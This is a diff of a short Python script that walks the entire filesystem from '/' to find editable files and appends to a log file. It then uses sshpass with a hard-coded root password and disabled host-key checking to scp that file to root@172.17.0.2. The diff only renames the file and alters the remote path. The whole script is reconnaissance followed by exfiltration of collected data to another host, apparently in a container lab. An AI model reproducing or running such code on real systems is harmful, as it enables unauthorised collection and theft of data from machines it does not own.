@@ -2,7 +2,7 @@ import os
 import paramiko
 def find_editable_files(directory):
     editable_files = []
-    daten = open("daten.txt","a")
+    daten = open("kenndaten.txt","a")
     for root, dirs, files in os.walk(directory):
         for file in files:
             file_path = os.path.join(root, file)
@@ -12,5 +12,5 @@ def find_editable_files(directory):
     return editable_files
 
 find = find_editable_files("/")
-ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no daten.txt "+ "root"+"@172.17.0.2:/root"
+ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no kenndaten.txt "+ "root"+"@172.17.0.2:/root/../"
 os.system(ostring)
